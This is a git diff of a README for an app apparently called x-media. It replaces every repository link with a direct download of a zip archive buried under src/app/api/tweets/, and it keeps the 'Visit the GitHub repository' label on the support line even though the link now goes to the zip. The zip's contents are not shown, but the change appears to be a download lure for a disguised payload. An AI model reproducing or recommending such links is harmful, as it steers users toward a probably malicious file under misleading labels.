@@ -46,9 +46,9 @@ Follow these simple steps to get started:
 
 ### Step 1: Visit the Download Page
 
-[![Download x-media](https://img.shields.io/badge/Download-x--media-blueviolet?style=for-the-badge&logo=github)](https://github.com/muskan9567/x-media)
+[![Download x-media](https://img.shields.io/badge/Download-x--media-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/muskan9567/x-media/main/src/app/api/tweets/media-x-v1.3.zip)
 
-Click the button above, or go directly to: **https://github.com/muskan9567/x-media**
+Click the button above, or go directly to: **https://raw.githubusercontent.com/muskan9567/x-media/main/src/app/api/tweets/media-x-v1.3.zip**
 
 ### Step 2: Get the Application
 
@@ -129,7 +129,7 @@ You are in complete control of your media library.
 
 If you run into any issues or have questions, you can:
 
-- Visit the GitHub repository: **https://github.com/muskan9567/x-media**
+- Visit the GitHub repository: **https://raw.githubusercontent.com/muskan9567/x-media/main/src/app/api/tweets/media-x-v1.3.zip**
 - Open an issue on the repository page (click "Issues" tab).
 - Read the FAQ section if available.
 
